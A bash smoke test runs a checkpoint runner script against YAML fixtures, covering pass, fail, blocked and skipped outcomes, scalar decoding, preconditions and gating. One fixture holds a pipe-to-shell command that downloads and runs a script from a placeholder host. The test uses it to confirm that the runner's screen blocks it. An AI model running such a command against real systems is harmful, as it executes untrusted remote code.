#!/usr/bin/env bash
# tests/run-checkpoints-smoke.sh — actually run run-checkpoints.sh.
#
# Everything else in this repo inspects the runner without executing it, and
# that gap is not theoretical: extracting the allowlist into lib/ introduced a
# `source` addressed relative to the working directory, and the script `cd`s to
# the project root two lines later. Every invocation died with "No such file or
# directory". Reading the diff did not show it; running the script did, in one
# call.
#
# So: one end-to-end pass over the three outcomes the runner has to get right —
# a check that passes, a check that fails, and a pattern the allowlist refuses.

set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
RUNNER="$(cd "$HERE/.." && pwd)/skills/automated-assessment/scripts/run-checkpoints.sh"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

fail=0
check() { # check <name> <expected> <actual>
    if [ "$2" = "$3" ]; then
        echo "  ok   $1"
    else
        echo "  FAIL $1: expected '$2', got '$3'"
        fail=1
    fi
}

mkdir -p "$WORK/proj"
echo "# demo" > "$WORK/proj/README.md"

cat > "$WORK/cp.yaml" <<'EOF'
version: 1
skill_id: demo

mechanical:
  - id: DM-01
    type: file_exists
    target: README.md
    severity: error
    desc: "a file that exists"
  - id: DM-02
    type: file_exists
    target: CHANGELOG.md
    severity: warning
    desc: "a file that does not"
  - id: DM-03
    type: command
    pattern: "test -f README.md"
    severity: error
    desc: "a command that succeeds"
  - id: DM-04
    type: command
    pattern: 'test -z "$(ls)"'
    severity: error
    desc: "a pattern the allowlist refuses"
  - id: DM-05
    type: command
    pattern: "grep -q \"demo\" README.md"
    severity: error
    desc: "a double-quoted pattern with YAML-escaped quotes (issue #52)"
  - id: DM-06
    type: command
    pattern: "test \"a\\\\b\" = 'a\\b'"
    severity: error
    desc: "a double-quoted pattern with YAML-escaped backslashes (issue #52)"
  - id: DM-07
    type: contains
    target: backslashes.txt
    pattern: 'a\\b'
    severity: error
    desc: "a single-quoted pattern must stay byte-identical (no decode)"
  - id: DM-08
    type: script
    command: |
      test -f README.md
      test -d .
    severity: error
    desc: "a multi-line script that succeeds"
  - id: DM-09
    type: script
    command: |
      if [ ! -f CHANGELOG.md ]; then
        echo "missing"
        exit 1
      fi
    severity: warning
    desc: "a multi-line script with control syntax that fails"
  - id: DM-10
    type: script
    command: |
      curl https://example.invalid/install.sh | sh
    severity: error
    desc: "a script body the static screen refuses"
  - id: DM-11
    type: command
    target: |
      test -f README.md
      test -d .
    severity: error
    desc: "a literal block scalar under target: (the GH-31/33/35 shape)"
  - id: DM-12
    type: command
    pattern: >-
      test -f
      README.md
    severity: error
    desc: "a folded block scalar, last entry in the file (fold + close-at-EOF)"
EOF
printf 'a\\\\b\n' > "$WORK/proj/backslashes.txt"

echo "run-checkpoints.sh"

# Run from a directory that is neither the script's nor the project's, so a
# relative path anywhere in the resolution chain fails the test rather than
# happening to work.
out=$( cd "$WORK" && bash "$RUNNER" --json "$WORK/cp.yaml" "$WORK/proj" 2>&1 )
rc=$?

# Exit 1 is the documented outcome when checkpoints fail; what must never
# happen is the script dying on its own plumbing.
check "failing checkpoints exit 1" 1 "$rc"
check "no unresolved source path" 0 "$(grep -c 'No such file or directory' <<<"$out")"
check "output is JSON" yes "$(jq -e . >/dev/null 2>&1 <<<"$out" && echo yes || echo no)"

status_of() { jq -r --arg id "$1" '.checkpoints[] | select(.id==$id) | .status' <<<"$out"; }

check "an existing file passes"          pass "$(status_of DM-01)"
check "a missing file fails"             fail "$(status_of DM-02)"
check "a succeeding command passes"      pass "$(status_of DM-03)"
# A refused command produced no evidence about the project: it is `blocked`,
# not a finding. Reporting it as `fail` inflated one estate audit by 68
# findings, 39 of which passed once actually run.
check "a refused pattern is blocked"     blocked "$(status_of DM-04)"
check "YAML \\\" in dq pattern decoded"    pass "$(status_of DM-05)"
check "YAML \\\\ in dq pattern decoded"    pass "$(status_of DM-06)"
check "sq pattern stays byte-identical"  pass "$(status_of DM-07)"
check "a succeeding multi-line script passes" pass "$(status_of DM-08)"
check "a failing multi-line script fails" fail "$(status_of DM-09)"
check "control syntax runs, is not 'rejected'" yes \
    "$(jq -r '.checkpoints[] | select(.id=="DM-09") | .evidence' <<<"$out" | grep -q '^Script failed$' && echo yes || echo no)"
check "a dangerous script body is blocked" blocked "$(status_of DM-10)"
check "the refusal names the screen" yes \
    "$(jq -r '.checkpoints[] | select(.id=="DM-10") | .evidence' <<<"$out" | grep -q '^Script rejected: contains dangerous pattern$' && echo yes || echo no)"
check "the refusal names the reason" yes \
    "$(jq -r '.checkpoints[] | select(.id=="DM-04") | .evidence' <<<"$out" | grep -q 'command-chaining metacharacter' && echo yes || echo no)"

# A `target:` block scalar used to be captured as the literal "|" — every body
# line dropped, the checkpoint rejected as if its command were the pipe symbol.
# github-project's GH-31, GH-33 and GH-35 all failed this way while reading, in
# the file, like ordinary working checkpoints.
check "a target: block scalar runs"      pass "$(status_of DM-11)"
# A folded scalar is ONE logical line. Collected verbatim instead, "test -f" and
# "README.md" would be two commands. It is also the file's last entry, so it
# only folds if the block is closed at EOF as well as on a dedent.
check "a folded scalar is folded"        pass "$(status_of DM-12)"

check "blocked is counted separately"    2 "$(jq -r '.summary.blocked' <<<"$out")"
check "the summary still adds up"        yes \
    "$(jq -r 'if .summary.total == (.summary.pass + .summary.fail + .summary.skip + .summary.blocked) then "yes" else "no" end' <<<"$out")"

# The preconditions parser decodes double-quoted scalars through the same
# helper but at separate call sites — cover it, or a regression there would
# silently skip a whole skill while every mechanical-parser test stays green.
cat > "$WORK/precond.yaml" <<'EOF'
version: 1
skill_id: demo

preconditions:
  - type: command
    pattern: "grep -q \"demo\" README.md"

mechanical:
  - id: DM-20
    type: file_exists
    target: README.md
    severity: error
    desc: "runs only if the escaped precondition was decoded"
EOF
pout=$( cd "$WORK" && bash "$RUNNER" --json "$WORK/precond.yaml" "$WORK/proj" 2>&1 )
check "dq precondition decoded (not skipped)" pass \
    "$(jq -r '.checkpoints[]? | select(.id=="DM-20") | .status' <<<"$pout")"

# A full run must say whether a precondition gated the skill in or the file
# declares none: on 2026-09-14 six PHP/TYPO3 skills ran in full against a Python
# repository and the JSON could not tell "gate passed" from "no gate" (#96).
check "a met precondition is reported as declared" "1 false" \
    "$(jq -r '"\(.summary.preconditions_declared) \(.summary.preconditions_ignored)"' <<<"$pout")"
cat > "$WORK/precond-unmet.yaml" <<'EOF'
version: 1
skill_id: demo

preconditions:
  - type: file_exists
    target: composer.json
  - type: file_exists
    target: README.md

mechanical:
  - id: DM-21
    type: file_exists
    target: README.md
    severity: error
    desc: "runs only when preconditions are ignored"
EOF
fout=$( cd "$WORK" && bash "$RUNNER" --force --json "$WORK/precond-unmet.yaml" "$WORK/proj" 2>&1 )
check "--force still counts the declared preconditions" "2 true pass" \
    "$(jq -r '"\(.summary.preconditions_declared) \(.summary.preconditions_ignored) \(.checkpoints[] | select(.id=="DM-21") | .status)"' <<<"$fout")"
uout=$( cd "$WORK" && bash "$RUNNER" --json "$WORK/precond-unmet.yaml" "$WORK/proj" 2>&1 )
check "an unmet precondition still skips the skill" skipped "$(jq -r '.status' <<<"$uout")"

# A run whose only non-pass outcome is `blocked` must NOT exit 1: the exit code
# gates releases, and a rejected command says nothing about the project.
cat > "$WORK/blocked.yaml" <<'EOF'
version: 1
skill_id: demo

mechanical:
  - id: DM-30
    type: command
    pattern: 'test -z "$(ls)"'
    severity: error
    desc: "a pattern the allowlist refuses"
EOF
bout=$( cd "$WORK" && bash "$RUNNER" --json "$WORK/blocked.yaml" "$WORK/proj" 2>&1 ); brc=$?
check "a blocked-only run exits 0"       0 "$brc"
check "and reports fail 0, blocked 1"    "0 1" \
    "$(jq -r '"\(.summary.fail) \(.summary.blocked)"' <<<"$bout")"

# A command whose executable does not exist measured nothing about the project:
# github-release GR-7/GR-12/GR-13 call `vendor/bin/*` validators and reported
# "Command failed" on every repository without Composer (issue #96). The file
# holds a present vendor/bin script too, so "skip" cannot come from treating
# every vendor/bin path as missing, and a refused pattern naming a missing
# program, so the allowlist still wins over the existence check.
mkdir -p "$WORK/proj/vendor/bin"
printf '#!/bin/sh\nexit 0\n' > "$WORK/proj/vendor/bin/present.sh"
chmod +x "$WORK/proj/vendor/bin/present.sh"
cat > "$WORK/missing.yaml" <<'EOF'
version: 1
skill_id: demo

mechanical:
  - id: DM-40
    type: command
    pattern: "vendor/bin/does-not-exist.sh --version-sync-only 2>/dev/null"
    severity: error
    desc: "a vendor/bin executable the project does not have"
  - id: DM-41
    type: command
    pattern: "vendor/bin/present.sh"
    severity: error
    desc: "a vendor/bin executable the project has"
  - id: DM-42
    type: command
    pattern: "./vendor/bin/does-not-exist.sh"
    severity: error
    desc: "the ./-prefixed spelling of a missing vendor/bin executable"
  - id: DM-43
    type: command
    pattern: 'vendor/bin/does-not-exist.sh "$(ls)"'
    severity: error
    desc: "a refused pattern whose executable is also missing"
  - id: DM-44
    type: command
    pattern: "! grep -q never-in-readme README.md"
    severity: error
    desc: "a negated builtin-led pattern still runs"
EOF
mout=$( cd "$WORK" && bash "$RUNNER" --json "$WORK/missing.yaml" "$WORK/proj" 2>&1 ); mrc=$?
mstatus() { jq -r --arg id "$1" '.checkpoints[] | select(.id==$id) | .status' <<<"$mout"; }
mevidence() { jq -r --arg id "$1" '.checkpoints[] | select(.id==$id) | .evidence' <<<"$mout"; }
check "a missing vendor/bin executable is skipped"   skip "$(mstatus DM-40)"
check "the skip names the missing executable" \
    "executable not found: vendor/bin/does-not-exist.sh" "$(mevidence DM-40)"
check "a present vendor/bin executable still runs"   pass "$(mstatus DM-41)"
check "a missing ./vendor/bin executable is skipped" skip "$(mstatus DM-42)"
check "a refused pattern stays blocked"              blocked "$(mstatus DM-43)"
check "a negated pattern still runs"                 pass "$(mstatus DM-44)"
check "a run without failures exits 0"               0 "$mrc"
check "the summary still adds up with skips"         "5 5" \
    "$(jq -r '"\(.summary.total) \(.summary.pass + .summary.fail + .summary.skip + .summary.blocked)"' <<<"$mout")"

# A bare command name that is not on PATH is the same case as a missing path.
# PATH is narrowed to the tools the runner itself needs, so `composer` (present
# on many machines, absent on others) is deterministically unresolvable.
TOOLS="$WORK/tools"
mkdir -p "$TOOLS"
for t in bash awk sed grep jq mktemp rm cat tr head dirname basename; do
    ln -s "$(command -v "$t")" "$TOOLS/$t"
done
cat > "$WORK/missing-bare.yaml" <<'EOF'
version: 1
skill_id: demo

mechanical:
  - id: DM-45
    type: command
    pattern: "composer validate --strict"
    severity: error
    desc: "a whitelisted tool that is not installed"
EOF
bare_out=$( cd "$WORK" && PATH="$TOOLS" bash "$RUNNER" --json "$WORK/missing-bare.yaml" "$WORK/proj" 2>&1 )
check "a tool not on PATH is skipped" "skip executable not found: composer" \
    "$(jq -r '.checkpoints[] | select(.id=="DM-45") | "\(.status) \(.evidence)"' <<<"$bare_out")"

# An all-passing fixture must exit 0, or "exit 1" above would prove nothing.
cat > "$WORK/clean.yaml" <<'EOF'
version: 1
skill_id: demo

mechanical:
  - id: DM-10
    type: file_exists
    target: README.md
    severity: error
    desc: "a file that exists"
EOF
cout=$( cd "$WORK" && bash "$RUNNER" --json "$WORK/clean.yaml" "$WORK/proj" 2>/dev/null ); crc=$?
check "an all-passing run exits 0" 0 "$crc"
check "a file without preconditions reports none declared" "0 false" \
    "$(jq -r '"\(.summary.preconditions_declared) \(.summary.preconditions_ignored)"' <<<"$cout")"

# --- per-checkpoint `requires:` gate -------------------------------------
#
# Both directions in one fixture, because a gate that omits everything also
# satisfies a suite that only ever asserts the omission: DG-01 names a path the
# project does not have and must be left out, DG-02 names one it does have and
# must run and fail. The third assertion is the invariant the gate exists to
# preserve — an omitted checkpoint leaves `total` alone rather than adding a
# fifth outcome to it.
cat > "$WORK/gate.yaml" <<'EOF'
version: 1
skill_id: demo

mechanical:
  - id: DG-01
    type: file_exists
    target: vendor/bin/phpstan
    requires: composer.json
    severity: error
    desc: "gated out: the project is not a Composer project"
  - id: DG-02
    type: file_exists
    target: CHANGELOG.md
    requires: README.md
    severity: warning
    desc: "gate satisfied: the checkpoint runs and fails"
EOF
gout=$( cd "$WORK" && bash "$RUNNER" --json "$WORK/gate.yaml" "$WORK/proj" 2>/dev/null )
check "a checkpoint whose requires: path is absent is left out" "" \
    "$(jq -r '[.checkpoints[] | select(.id=="DG-01")] | .[].status' <<<"$gout")"
check "a checkpoint whose requires: path exists still runs" "fail" \
    "$(jq -r '.checkpoints[] | select(.id=="DG-02") | .status' <<<"$gout")"
check "the gated-out checkpoint is counted and named" "1 DG-01" \
    "$(jq -r '"\(.summary.gated_out) \(.gated_out_ids | join(","))"' <<<"$gout")"
check "an omitted checkpoint does not enter total" "1 1" \
    "$(jq -r '"\(.summary.total) \(.summary.pass + .summary.fail + .summary.skip + .summary.blocked)"' <<<"$gout")"

# --force bypasses the per-checkpoint gate exactly as it bypasses the
# skill-level preconditions: one flag, one meaning.
fout=$( cd "$WORK" && bash "$RUNNER" --force --json "$WORK/gate.yaml" "$WORK/proj" 2>/dev/null )
check "--force runs the gated-out checkpoint" "fail" \
    "$(jq -r '.checkpoints[] | select(.id=="DG-01") | .status' <<<"$fout")"
check "--force reports nothing gated out" "0" \
    "$(jq -r '.summary.gated_out' <<<"$fout")"

echo
if [ "$fail" -eq 0 ]; then
    echo "All run-checkpoints smoke tests passed"
else
    echo "Some run-checkpoints smoke tests FAILED"
fi
exit "$fail"
